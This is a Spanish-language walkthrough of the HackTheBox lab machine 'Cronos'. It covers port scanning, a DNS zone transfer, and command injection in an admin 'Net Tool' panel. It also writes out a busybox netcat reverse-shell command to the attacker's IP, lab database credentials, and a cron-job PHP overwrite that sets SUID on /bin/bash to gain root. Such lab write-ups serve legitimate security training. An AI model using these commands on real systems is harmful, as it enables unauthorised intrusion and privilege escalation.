---
title: Cronos
platform: HackTheBox
difficulty: Medium
os: Linux
releaseDate: 2017-03-22
date: 2026-04-23
publishedAt: 2026-11-26
tags: [RCE, CronJob, Linux, Medium, HTB]
image: ./thumb.png
imageShape: round
userRank: 13868
rating: 4.9
---

---

# Descripcion

Cronos es una máquina Linux de dificultad Media en HackTheBox que expone SSH (22), DNS (53) y HTTP (80). Un AXFR Zone Transfer revela el subdominio oculto admin.cronos.htb, cuyo panel "Net Tool" es vulnerable a inyección de comandos, otorgando una reverse shell como www-data. Dentro se hallan credenciales de MySQL y el usuario noulis. La escalada a root abusa de una tarea cron que ejecuta el binario artisan como root, pero es escribible por www-data, permitiendo inyectar código PHP para establecer el bit `SUID` en `/bin/bash`.

---

# Enumeracion

## Nmap

> Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -Pn -n -sS -v 10.129.227.211
```

![Pasted-image-20261125212958.png](./Images/Pasted-image-20261125212958.png)

> Una vez identificados los puertos abiertos, realizamos un segundo escaneo utilizando los scripts predeterminados de Nmap y la detección de versiones para obtener más información sobre los servicios.

```bash
nmap -p22,53,80 -sC -sV 10.129.227.211
```

![Pasted-image-20261125213002.png](./Images/Pasted-image-20261125213002.png)


## Web

> Comenzamos identificando las tecnologías utilizadas por la aplicación mediante `WhatWeb`.


```bash
whatweb http://cronos.htb
```

![Pasted-image-20261125213007.png](./Images/Pasted-image-20261125213007.png)

- **Web**

![Pasted-image-20261125213010.png](./Images/Pasted-image-20261125213010.png)

> Como observamos que el servicio DNS está abierto, vamos a probar a realizar un `AXFR Zone Transfer` para comprobar si existen `subdominios` activos. Para ello utilizaremos `dig`.

```bash
dig axfr @10.129.227.211 cronos.htb
```

![Pasted-image-20261125213015.png](./Images/Pasted-image-20261125213015.png)

> Encontramos 3 subdominios, así que vamos a añadirlos a nuestro `/etc/hosts`.

- Vamos a `admin`

![Pasted-image-20261125213020.png](./Images/Pasted-image-20261125213020.png)

- Enumeramos con `nmap`

![Pasted-image-20261125213025.png](./Images/Pasted-image-20261125213025.png)

- Enumeramos directorios con `gobuster`
```bash
gobuster dir -u http://admin.cronos.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x txt,php
```

![Pasted-image-20261125213029.png](./Images/Pasted-image-20261125213029.png)

# Shell como www-data

## RCE

> Vemos que `welcome.php` nos entrega algo de información antes de redirigirnos a `index.php`. Vamos a revisarlo con Burp Suite.

![Pasted-image-20261125213033.png](./Images/Pasted-image-20261125213033.png)

- Código `HTML`
```html
<html">
   
   <head>
      <title>Net Tool v0.1 </title>
   </head>
   
   <body>
	<h1>Net Tool v0.1</h1>
	<form method="POST" action="">
	<select name="command">
		<option value="traceroute">traceroute</option>
		<option value="ping -c 1">ping</option>
	</select>
	<input type="text" name="host" value="8.8.8.8"/>
	<input type="submit" value="Execute!"/>
	</form>
	      <p><a href = "logout.php">Sign Out</a></p>
   </body>
   
</html>
```

> Parece que nos permite ver un panel donde podemos enviar dos comandos, `traceroute` y `ping`. Vamos a intentar realizar una petición `POST` para comprobar si se ejecuta correctamente. Para ello, nos enviaremos un ping.

- Vemos paquetes con `tcpdump`
```bash
sudo tcpdump -i tun0 icmp
```

- Enviamos `ping`

![Pasted-image-20261125213038.png](./Images/Pasted-image-20261125213038.png)

- Lo recibimos

![Pasted-image-20261125213043.png](./Images/Pasted-image-20261125213043.png)

> Bien, ahora vamos a probar si al cambiar el comando podemos ejecutar otros además de `ping` y `traceroute`. Probamos con un `curl`.

- Abrimos servidor web
```bash
python3 -m http.server 80
```

- Mandamos petición

![Pasted-image-20261125213050.png](./Images/Pasted-image-20261125213050.png)

- Recibimos correctamente

![Pasted-image-20261125213056.png](./Images/Pasted-image-20261125213056.png)

> Parece que podemos ejecutar comandos, así que vamos a enviarnos una `RCE`.

- Escuchamos por `nc`
```bash
nc -nvlp 7777
```

- Mandamos petición
```bash
busybox nc 10.10.14.154 7777 -e /bin/bash
```

![Pasted-image-20261125213101.png](./Images/Pasted-image-20261125213101.png)

- Recibimos la shell

![Pasted-image-20261125213107.png](./Images/Pasted-image-20261125213107.png)

# Shell como root

## Enumeracion

> Si listamos el directorio en el que nos encontramos, vemos que estamos justo en los archivos de la página web.

![Pasted-image-20261125213112.png](./Images/Pasted-image-20261125213112.png)

> Leemos `config.php`

![Pasted-image-20261125213117.png](./Images/Pasted-image-20261125213117.png)

> Obtenemos las credenciales para la `BBDD`.

```text
user: admin
pass: kEjdbRigfBHUREiNSDs
```

> Vemos qué puertos tiene abiertos la máquina.

```bash
netstat -tunl
```

![Pasted-image-20261125213123.png](./Images/Pasted-image-20261125213123.png)

> El puerto de `mysql` está abierto. Antes de entrar a la base de datos, vamos a listar los usuarios de la máquina.

```bash
ls -la /home
cat /etc/passwd | grep "sh"
```

![Pasted-image-20261125213127.png](./Images/Pasted-image-20261125213127.png)

> Existe un usuario llamado `noulis`. Ahora vamos a entrar en la base de datos para ver si existe alguna información relevante para ese usuario.

## BBDD

```bash
mysql -u admin -p
```

![Pasted-image-20261125213133.png](./Images/Pasted-image-20261125213133.png)

- Listamos las bases de datos
```sql
show databases;
```

![Pasted-image-20261125213137.png](./Images/Pasted-image-20261125213137.png)

- Seleccionamos la de `admin`
```sql
use admin;
```

- Mostramos las tablas
```sql
show tables;
```

![Pasted-image-20261125213142.png](./Images/Pasted-image-20261125213142.png)

- Buscamos todo el contenido de `users`
```sql
select * from users;
```

![Pasted-image-20261125213147.png](./Images/Pasted-image-20261125213147.png)

```text
4f5fffa7b2340178a716e3832451e058
```

> Vemos un usuario `admin` con una contraseña en `MD5`. Vamos a intentar crackearla con `john`, guardándola en nuestra máquina en un archivo `hash.txt`.

```bash
sudo john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> Pero ni `john` ni `hashcat` encuentran la contraseña, así que es posible que no sea el camino correcto. Si vamos a `/home/noulis`, podemos entrar y ver la flag en `user.txt`.

![Pasted-image-20261125213152.png](./Images/Pasted-image-20261125213152.png)

> Vemos el archivo de configuración de `crontab`.

```bash
cat /etc/crontab
```

![Pasted-image-20261125213157.png](./Images/Pasted-image-20261125213157.png)

## Comprometiendo artisan

> El usuario `root` está ejecutando ese archivo `php`. Vamos a ver qué contiene.

- `artisan`
```php
#!/usr/bin/env php
<?php

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/

require __DIR__.'/bootstrap/autoload.php';

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Artisan Application
|--------------------------------------------------------------------------
|
| When we run the console application, the current CLI command will be
| executed in this console and the response sent back to a terminal
| or another output device for the developers. Here goes nothing!
|
*/

$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);

$status = $kernel->handle(
    $input = new Symfony\Component\Console\Input\ArgvInput,
    new Symfony\Component\Console\Output\ConsoleOutput
);

/*
|--------------------------------------------------------------------------
| Shutdown The Application
|--------------------------------------------------------------------------
|
| Once Artisan has finished running. We will fire off the shutdown events
| so that any final work may be done by the application before we shut
| down the process. This is the last thing to happen by the request.
|
*/

$kernel->terminate($input, $status);
```

- Miramos los permisos del archivo

![Pasted-image-20261125213205.png](./Images/Pasted-image-20261125213205.png)

> Vemos que tenemos permisos de escritura, así que vamos a cambiar el `php` que contiene por uno modificado por nosotros para que ejecute código malicioso. Este lo que hará será añadir permisos `SUID` al `/bin/bash`.

- Vemos permisos de `/bin/bash`
```bash
ls -la /bin/bash
```

![Pasted-image-20261125213221.png](./Images/Pasted-image-20261125213221.png)

- Modificamos `artisan`
```php
#!/usr/bin/env php
<?php
	system('chmod +s /bin/bash');
?>
```

- Esperamos 1 minuto y volvemos a ver los permisos

![Pasted-image-20261125213226.png](./Images/Pasted-image-20261125213226.png)

> Tenemos permisos `SUID` en la `bash`. Ahora podemos ejecutarla y obtener una `shell` como `root`.

```bash
bash -p
```

![Pasted-image-20261125213231.png](./Images/Pasted-image-20261125213231.png)